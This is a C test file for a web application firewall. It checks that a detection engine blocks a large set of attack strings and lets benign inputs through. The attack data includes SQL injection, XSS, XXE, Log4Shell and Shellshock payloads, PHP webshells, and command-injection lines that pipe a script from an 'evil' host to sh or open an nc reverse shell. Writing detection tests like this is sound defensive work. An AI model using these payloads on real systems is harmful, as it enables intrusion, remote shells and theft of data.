#include "../src/engines/waf_core.h"
static int fails=0,total=0;
#define CHECK(c,m) do{total++; if(!(c)){fails++;printf("FAIL: %s (line %d)\n",m,__LINE__);} }while(0)
static int blocked(const char *q,int par,char *cat,size_t cn){ WafVerdict v; waf_inspect_text(q,par,&v); if(cat) snprintf(cat,cn,"%s",v.top); return v.blocked; }
static const struct { const char *p; const char *cat; } ATT[]={
 /* SQLi */
 {"1' OR '1'='1","SQL"}, {"1%27%20OR%20%271%27%3D%271","SQL"}, {"admin'--","SQL"}, {"' OR 1=1--","SQL"}, {"1 UNION SELECT username,password FROM users","SQL"},
 {"1/**/UNION/**/SELECT/**/1,2,3","SQL"}, {"1' un/**/ion sel/**/ect 1,2--","SQL"}, {"1;DROP TABLE users","SQL"}, {"1'; WAITFOR DELAY '0:0:5'--","SQL"}, {"1 AND SLEEP(5)","SQL"},
 {"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","SQL"}, {"x' AND extractvalue(1,concat(0x7e,version()))--","SQL"}, {"1 UNION ALL SELECT table_name FROM information_schema.tables","SQL"},
 {"%2527%2520OR%2520%25271%2527%253D%25271","SQL"}, {"1' ORDER BY 10--","SQL"}, {"'; EXEC xp_cmdshell('dir')--","SQL"}, {"1 OR 2>1","SQL"}, {"') OR ('1'='1","SQL"}, {"1' AND 1=CONVERT(int,(SELECT @@version))--","SQL"},
 {"/*!50000UNION*/ /*!50000SELECT*/ 1,2","SQL"}, {"1' AND 'a'='a","SQL"}, {"' or ''='","SQL"}, {"1 AND (SELECT COUNT(*) FROM sysobjects)>0","SQL"}, {"1';SELECT pg_sleep(5)--","SQL"},
 /* XSS */
 {"<script>alert(1)</script>","Cross-Site"}, {"%3Cscript%3Ealert(1)%3C/script%3E","Cross-Site"}, {"<img src=x onerror=alert(1)>","Cross-Site"}, {"<svg/onload=alert(1)>","Cross-Site"}, {"\"><script>alert(document.cookie)</script>","Cross-Site"},
 {"javascript:alert(1)","Cross-Site"}, {"<iframe src=javascript:alert(1)>","Cross-Site"}, {"&lt;script&gt;alert(1)&lt;/script&gt;","Cross-Site"}, {"%253Cscript%253Ealert(1)%253C/script%253E","Cross-Site"},
 {"<body onload=alert(1)>","Cross-Site"}, {"'\"><img src=x onerror=prompt(1)>","Cross-Site"}, {"<a href=\"javascript:alert(1)\">x</a>","Cross-Site"}, {"<ScRiPt>alert(1)</sCrIpT>","Cross-Site"}, {"%u003cscript%u003ealert(1)%u003c/script%u003e","Cross-Site"},
 {"<details open ontoggle=alert(1)>","Cross-Site"}, {"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==","Cross-Site"}, {"{{constructor.constructor('alert(1)')()}}","Cross-Site"},
 /* XXE */
 {"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>","XML"}, {"<!DOCTYPE r [<!ENTITY % d SYSTEM \"http://evil/x.dtd\"> %d;]>","XML"},
 {"<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;\">]><lolz>&lol4;</lolz>","XML"},
 {"<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>","XML"},
 /* traversal / LFI / RFI */
 {"../../../../etc/passwd","Path"}, {"..%2f..%2f..%2fetc%2fpasswd","Path"}, {"%2e%2e%2f%2e%2e%2fetc%2fpasswd","Path"}, {"....//....//....//etc/passwd","Path"}, {"..\\..\\..\\windows\\win.ini","Path"}, {"/etc/passwd","Path"},
 {"%252e%252e%252fetc%252fpasswd","Path"}, {"php://filter/convert.base64-encode/resource=index.php","Local File"}, {"expect://id","Local File"}, {"/proc/self/environ","Local File"},
 /* command injection */
 {"; cat /etc/passwd","Command"}, {"| whoami","Command"}, {"$(id)","Command"}, {"`id`","Command"}, {"127.0.0.1; ls -la","Command"}, {"a && curl http://evil/x.sh | sh","Command"}, {"; nc -e /bin/sh 10.0.0.1 4444","Command"},
 {"%7C%20whoami","Command"}, {"x; powershell -enc SQBFAFgA","Command"}, {"|| ping -c 10 127.0.0.1","Command"}, {"a;cat${IFS}/etc/passwd","Command"},
 /* SSRF */
 {"http://169.254.169.254/latest/meta-data/","Server-Side Request"}, {"http://127.0.0.1:8080/admin","Server-Side Request"}, {"gopher://127.0.0.1:6379/_FLUSHALL","Server-Side Request"}, {"http://localhost/","Server-Side Request"},
 {"http://[::1]/","Server-Side Request"}, {"http://metadata.google.internal/computeMetadata/v1/","Server-Side Request"},
 /* SSTI */
 {"{{7*7}}","Server-Side Template"}, {"${7*7}","Server-Side Template"}, {"{{''.__class__.__mro__[1].__subclasses__()}}","Server-Side Template"}, {"<%= 7*7 %>","Server-Side Template"}, {"{{config.items()}}","Server-Side Template"},
 /* NoSQL / LDAP / XPath */
 {"username[$ne]=x&password[$ne]=x","NoSQL"}, {"{\"$gt\":\"\"}","NoSQL"}, {"{\"username\":{\"$regex\":\".*\"}}","NoSQL"}, {"*)(uid=*))(|(uid=*","LDAP"}, {"admin)(&(password=*))","LDAP"}, {"' or '1'='1' or //*","Injection"},
 /* CRLF / log4j / shellshock / ognl / deser / proto / webshell */
 {"foo%0d%0aSet-Cookie:%20a=b","Header"}, {"x%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK","Header"}, {"${jndi:ldap://evil.com/a}","Log4Shell"}, {"${${lower:j}ndi:${lower:l}dap://evil/a}","Log4Shell"}, {"${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}","Log4Shell"},
 {"() { :;}; /bin/bash -c 'cat /etc/passwd'","Shellshock"}, {"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}","Expression"}, {"class.module.classLoader.resources.context.parent.pipeline.first.pattern=x","Expression"},
 {"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeA==","Insecure"}, {"O:8:\"stdClass\":1:{s:1:\"a\";s:1:\"b\";}","Insecure"}, {"__proto__[admin]=true","Prototype"}, {"constructor.prototype.isAdmin=true","Prototype"},
 {"<?php system($_GET['c']); ?>","Webshell"}, {"<?php eval(base64_decode($_POST['x'])); ?>","Webshell"}, {"<%@ page import=\"java.io.*\" %>","Webshell"},
 {NULL,NULL}};
static const char *BEN[]={
 "hello world","john.smith@example.com","O'Brien","McDonald's restaurant","Please select a seat from the list below","I want to order 2 and 3 items","price<100 and price>10",
 "https://example.com/products?id=42&sort=asc","/api/v1/users/42/profile","/static/css/app.min.css?v=1.2.3","The quick brown fox jumps over the lazy dog","a=1&b=2&c=3",
 "select your favourite colour","union of the states","drop me a line anytime","insert coin to continue","where do you want to go from here","order by date or by name",
 "C:\\Users\\Public\\Documents","2026-10-11T10:30:00Z","{\"name\":\"Ali\",\"age\":30,\"tags\":[\"a\",\"b\"]}","<p>Hello</p>","I <3 security","if a < b and b > c then","100% sure","50 or 60 people attended","1+1=2","A & B","rock & roll","key=value;other=thing",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","search?q=best+laptops+2026","user_id=12345","page=2","lang=en-US","redirect=/dashboard","next=/profile/settings","file=report-2026.pdf","image=avatar.png",
 "My password is hunter2","SELECT is a SQL keyword","how do I use the cat command","please ping me tomorrow","the id of the product is 7","call me at 555-1234","a/b/c","./relative/path","../not-so-bad.png-ish",
 "نص عربي عادي للتجربة","Ünïcödé tëxt ñ","Great product, 5 stars!","Meeting at 10:30; bring the slides","name=Smith&city=London",NULL};
int main(void){
  char cat[40]; int miss=0, total_att=0;
  for(int i=0;ATT[i].p;i++){ total_att++; int b=blocked(ATT[i].p,2,cat,sizeof cat); total++; if(!b||!strstr(cat,ATT[i].cat)){ fails++; miss++; printf("MISS (blocked=%d top='%s' want '%s'): %s\n",b,cat,ATT[i].cat,ATT[i].p); } }
  int fp=0,nb=0; for(int i=0;BEN[i];i++){ nb++; total++; if(blocked(BEN[i],2,cat,sizeof cat)){ fails++; fp++; printf("FALSE POSITIVE (%s): %s\n",cat,BEN[i]); } }
  printf("attacks: %d/%d detected & correctly categorised; benign: %d/%d allowed (paranoia 2)\n",total_att-miss,total_att,nb-fp,nb);
  /* full requests */
  { WafRequest r={"POST","/login","User-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\nHost: a.com\n",(const unsigned char*)"user=admin&pass=x%27%20OR%20%271%27%3D%271",43}; WafVerdict v; waf_inspect(&r,1,&v); CHECK(v.blocked,"form body SQLi blocked at paranoia 1"); }
  { WafRequest r={"GET","/search?q=laptop&page=2","User-Agent: Mozilla/5.0\nAccept: */*\nHost: a.com\n",NULL,0}; WafVerdict v; waf_inspect(&r,3,&v); CHECK(!v.blocked,"normal search allowed even at paranoia 3"); }
  { WafRequest r={"GET","/","User-Agent: sqlmap/1.7\nHost: a.com\n",NULL,0}; WafVerdict v; waf_inspect(&r,1,&v); CHECK(v.nhits>0&&!strcmp(v.top,"Scanner Detection"),"scanner UA detected"); }
  { WafRequest r={"GET","/","User-Agent: x\nX-Api-Version: ${jndi:ldap://e/a}\nHost: a.com\n",NULL,0}; WafVerdict v; waf_inspect(&r,1,&v); CHECK(v.blocked,"log4shell in a header blocked at paranoia 1"); }
  { WafRequest r={"POST","/x","Content-Length: 5\nTransfer-Encoding: chunked\nHost: a\n",(const unsigned char*)"0\r\n\r\n",5}; WafVerdict v; waf_inspect(&r,1,&v); CHECK(v.blocked,"CL+TE smuggling blocked"); }
  { WafRequest r={"GET","/.env","User-Agent: curl/8\nHost: a\n",NULL,0}; WafVerdict v; waf_inspect(&r,2,&v); CHECK(v.blocked,".env probe blocked at paranoia 2"); }
  { WafRequest r={"GET","/..%2f..%2f..%2fetc/passwd","Host: a\n",NULL,0}; WafVerdict v; waf_inspect(&r,1,&v); CHECK(v.blocked,"encoded traversal in path blocked at paranoia 1"); }
  { const char *b="--X\r\nContent-Disposition: form-data; name=\"f\"; filename=\"shell.php\"\r\nContent-Type: image/png\r\n\r\nGIF89a<?php system($_GET[0]);?>\r\n--X--"; WafRequest r={"POST","/upload","Content-Type: multipart/form-data; boundary=X\nHost: a\n",(const unsigned char*)b,strlen(b)}; WafVerdict v; waf_inspect(&r,1,&v); CHECK(v.blocked,"php webshell upload blocked"); }
  { WafRequest r={"POST","/api","Content-Type: application/json\nHost: a\n",(const unsigned char*)"{\"user\":\"ali\",\"note\":\"please select a plan from the list\"}",strlen("{\"user\":\"ali\",\"note\":\"please select a plan from the list\"}")}; WafVerdict v; waf_inspect(&r,2,&v); CHECK(!v.blocked,"benign JSON allowed"); }
  { WafRequest r={"POST","/api","Content-Type: application/json\nHost: a\n",(const unsigned char*)"{\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}}",strlen("{\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}}")}; WafVerdict v; waf_inspect(&r,2,&v); CHECK(v.blocked,"NoSQL JSON body blocked"); }
  /* hit metadata */
  { WafVerdict v; waf_inspect_text("1' OR '1'='1",1,&v); CHECK(v.nhits>0&&!strcmp(v.hits[0].cwe,"CWE-89")&&v.hits[0].mitre[0]=='T',"CWE and MITRE reported"); CHECK(!strcmp(v.severity,"High")||!strcmp(v.severity,"Critical"),"severity"); }
  /* robustness */
  { char *big=malloc(400000); memset(big,'A',399999); big[399999]=0; WafVerdict v; waf_inspect_text(big,1,&v); CHECK(!v.blocked,"huge benign input handled"); free(big); }
  { WafVerdict v; waf_inspect_text("%",2,&v); waf_inspect_text("%u00",2,&v); waf_inspect_text("&#",2,&v); waf_inspect_text("&#xZZ;",2,&v); waf_inspect_text("\\x",2,&v); waf_inspect_text("",2,&v); CHECK(1,"malformed escapes do not crash"); }
  printf("%d/%d passed\n",total-fails,total); return fails?1:0; }
